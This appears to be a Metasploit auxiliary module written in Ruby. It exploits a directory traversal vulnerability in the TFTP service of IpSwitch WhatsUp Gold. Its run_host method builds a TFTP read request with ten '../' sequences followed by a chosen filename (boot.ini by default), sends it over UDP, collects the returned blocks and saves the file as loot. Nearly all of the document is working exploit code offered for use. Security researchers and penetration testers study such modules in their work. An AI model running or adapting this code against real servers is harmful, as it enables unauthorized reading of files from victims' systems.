##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'           => "IpSwitch WhatsUp Gold TFTP Directory Traversal",
      'Description'    => %q{
          This modules exploits a directory traversal vulnerability in IpSwitch WhatsUp
        Gold's TFTP service.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Prabhu S Angadi',  #Initial discovery and poc
          'sinn3r',           #Metasploit
          'juan vazquez'      #More improvements
        ],
      'References'     =>
        [
          ['OSVDB', '77455'],
          ['BID', '50890'],
          ['EDB', '18189'],
          ['URL', 'http://secpod.org/advisories/SecPod_Ipswitch_TFTP_Server_Dir_Trav.txt']
        ],
      'DisclosureDate' => "Dec 12 2011"
    ))

    register_options(
      [
        Opt::RPORT(69),
        OptString.new('FILENAME', [false, 'The file to loot', 'boot.ini']),
        OptBool.new('SAVE', [false, 'Save the downloaded file to disk', 'false'])
      ], self.class)
  end

  def run_host(ip)
    # Prepare the filename
    file_name  = "../"*10
    file_name << datastore['FILENAME']

    # Prepare the packet
    pkt = "\x00\x01"
    pkt << file_name
    pkt << "\x00"
    pkt << "octet"
    pkt << "\x00"

    # We need to reuse the same port in order to receive the data
    udp_sock = Rex::Socket::Udp.create(
      {
        'Context' => {'Msf' => framework, 'MsfExploit'=>self}
      }
    )

    add_socket(udp_sock)

    # Send the packet to target
    file_data = ''
    udp_sock.sendto(pkt, ip, datastore['RPORT'].to_i)

    while (r = udp_sock.recvfrom(65535, 0.1) and r[1])

      opcode, block, data = r[0].unpack("nna*") # Parse reply
      if opcode != 3 # Check opcode: 3 => Data Packet
        print_error("Error retrieving file #{file_name} from #{ip}")
        return
      end
      file_data << data
      udp_sock.sendto(tftp_ack(block), r[1], r[2].to_i, 0) # Ack

    end

    if file_data.empty?
        print_error("Error retrieving file #{file_name} from #{ip}")
        return
    end

    udp_sock.close

    # Output file if verbose
    vprint_line(file_data.to_s)

    # Save file to disk
    path = store_loot(
      'whatsupgold.tftp',
      'application/octet-stream',
      ip,
      file_data,
      datastore['FILENAME']
    )

    print_status("File saved in: #{path}")
  end

  #
  # Returns an Acknowledgement
  #
  def tftp_ack(block=1)

    pkt = "\x00\x04" # Ack
    pkt << [block].pack("n") # Block Id

  end

end

=begin
Remote code execution might be unlikely with this directory traversal bug, because WRITE
requests are forbidden by default, and cannot be changed.
=end
